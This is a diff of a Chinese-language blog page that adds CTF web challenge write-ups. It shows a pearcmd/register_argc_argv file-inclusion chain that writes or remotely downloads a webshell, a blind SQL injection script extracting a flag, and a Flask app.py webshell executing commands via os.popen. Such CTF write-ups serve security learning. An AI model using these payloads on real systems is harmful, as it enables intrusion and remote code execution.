@@ -95,7 +95,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">2.2k</span>
+            <span class="post-count">2.8k</span>
         </span>
     </span>
 
@@ -104,7 +104,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">11 分钟</span>
+            <span class="post-count">14 分钟</span>
         </span>
     </span>
 </div>
@@ -250,6 +250,66 @@
 <blockquote>
 <p>GET：<br>star&#x3D;eval(next(getallheaders()));<br><img src="https://img-blog.csdnimg.cn/bffdd37418c0412c80b75fb545225002.png" alt="123"></p>
 </blockquote>
+<h2 id="week3-web"><a href="#week3-web" class="headerlink" title="week3-web"></a>week3-web</h2><h3 id="Include"><a href="#Include" class="headerlink" title="Include"></a>Include</h3><p>知识点：下载木马文件到靶机、register_argc_argv</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag|log|session|filter|input|data/i'</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        
+        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment"># Something in phpinfo.php!</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>先包含phpinfo.php文件看看<br>搜索flag发现提示<code>register_argc_argv</code><br><img src="https://img-blog.csdnimg.cn/b99c8a88c07a4e6286d25ca285e74158.png" alt="456"><br>找找有没有相关漏洞，恰好找到了一篇文章：<a target="_blank" rel="noopener" href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%20to%20RCE%E7%9A%84%E5%B7%A7%E5%A6%99%E7%BB%84%E5%90%88/">registerargcargv与include to RCE的巧妙组合</a></p>
+<blockquote>
+<p>&#x2F;&#x2F;通过本地直接写入webshell,注意这里最好抓包然后用burpsuite或者直接curl执行，否则浏览器会将&lt; ? &gt; 转义<br>&#x2F;&#x2F; config-create可以直接创建配置文件，且第一个参数必须以&#x2F;开头<br><a href="http://ip:port/include.php?f=pearcmd&amp;+config-create+/">http://ip:port/include.php?f=pearcmd&amp;+config-create+/</a><?=phpinfo();?>+&#x2F;tmp&#x2F;evil.php<br>&#x2F;&#x2F; 通过远程直接下载webshell<br>&#x2F;&#x2F; web目录可写</p>
+<ul>
+<li><a href="http://ip:port/include.php?f=pearcmd&amp;+install+-R+/var/www/html+http://ip:port/evil.php">http://ip:port/include.php?f=pearcmd&amp;+install+-R+/var/www/html+http://ip:port/evil.php</a></li>
+<li><a href="http://ip:port/tmp/pear/download/evil.php">http://ip:port/tmp/pear/download/evil.php</a><br>&#x2F;&#x2F; tmp目录可写</li>
+<li><a href="http://ip:port/include.php?f=pearcmd&amp;+install+-R+/tmp+http://ip:port/evil.php">http://ip:port/include.php?f=pearcmd&amp;+install+-R+/tmp+http://ip:port/evil.php</a></li>
+<li><a href="http://ip:port/include.php?f=/tmp/pear/download/evil">http://ip:port/include.php?f=/tmp/pear/download/evil</a></li>
+</ul>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/7d3cce3881de4f9a89bc8e659bf3f395.png" alt="789"><br><img src="https://img-blog.csdnimg.cn/66e920198f60410f8ba08d44e18bb64f.png" alt="789"><br>然后访问<code>/tmp/pear/download/1.php</code>发现成功传入<br><img src="https://img-blog.csdnimg.cn/1daa56ab972347a98aa42ad9931a2d1a.png" alt="456"></p>
+<h3 id="medium-sql"><a href="#medium-sql" class="headerlink" title="medium_sql"></a>medium_sql</h3><p>知识点：sql盲注<br><img src="https://img-blog.csdnimg.cn/a6ea86a9c7d14d3d853ce0e18ea3c65f.png" alt="1"><br>尝试注入：<br>单引号不回显<br><code>1TMP3074&#39;Or 1=1 -- -</code><br>成功回显<br>burp测试过滤的函数或字符，发现如下的被过滤了<br><img src="https://img-blog.csdnimg.cn/8bc362b3464d4e77a078e91c27a32ddf.png" alt="1"><br>使用order by发现存在5个表，但是后面再使用union是发现没有union，换一种方法<br>使用盲注判断当前数据库名的字符数<br><code>?id=1TMP3074&#39; Or length(database()) &gt; 2--+</code>回显<br><code>?id=1TMP3074&#39; Or length(database()) &gt; 3--+</code>不回显，说明当前数据库名的字符数为三。<br>然后判断数据库名到底是什么<br><code>?id=1TMP3074&#39;Or mid(database(),1,1)= &#39;b&#39; --</code>这样太慢了，使用脚本<br>最后的exp：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> time
+
+url <span class="token operator">=</span> <span class="token string">"http://13d36774-d283-422c-98f2-9164d199a034.node4.buuoj.cn:81/?id=TMP0919'AND "</span>
+
+result <span class="token operator">=</span> <span class="token string">''</span>
+i <span class="token operator">=</span> <span class="token number">0</span>
+
+<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>
+    head <span class="token operator">=</span> <span class="token number">32</span>
+    tail <span class="token operator">=</span> <span class="token number">127</span>
+
+    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
+        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>
+        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'Ascii(Substr((Select flag from here_is_flag),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">--+'</span></span>
+        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token string">"points"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            tail <span class="token operator">=</span> mid
+
+    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
+        result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">break</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
+    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 暂停1秒，降低爬取速度</span>
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://img-blog.csdnimg.cn/18afb59598064b03b3ab0b7644b4a319.png" alt="1"></p>
 <h2 id="week4-web"><a href="#week4-web" class="headerlink" title="week4-web"></a>week4-web</h2><h3 id="逃"><a href="#逃" class="headerlink" title="逃"></a>逃</h3><p>知识点：字符串逃逸</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -510,6 +570,29 @@ flag <span class="token operator">=</span> <span class="token string">""</span>
             flag <span class="token operator">+=</span> j
             <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
             <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="flask-disk"><a href="#flask-disk" class="headerlink" title="flask disk"></a>flask disk</h3><p>这个看了wp，我是真的没有想到:cry:</p>
+<p>整体思路就是再上传一个app.py文件将原来的覆盖掉，而且自己上传的app.py文件可以进行命令执行</p>
+<p>上传的app.py文件</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#编写一个能够执行系统命令的app.py文件</span>
+
+<span class="token keyword">import</span> os
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> request<span class="token punctuation">,</span>Flask
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        cmd <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">)</span>
+        data<span class="token operator">=</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span> data
+    <span class="token keyword">except</span><span class="token punctuation">:</span>
+        <span class="token keyword">pass</span>
+    <span class="token keyword">return</span> <span class="token string">"1"</span>
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">,</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在访问主页面发现页面显示1<br><img src="https://img-blog.csdnimg.cn/ba72b904153041518054f8b91dc9fa42.png" alt="1"></p>
+<p>然后命令执行找到flag文件即可<br><img src="https://img-blog.csdnimg.cn/08117b98aae246469e673400a37b8fd7.png" alt="4"></p>
  
       <!-- reward -->
       
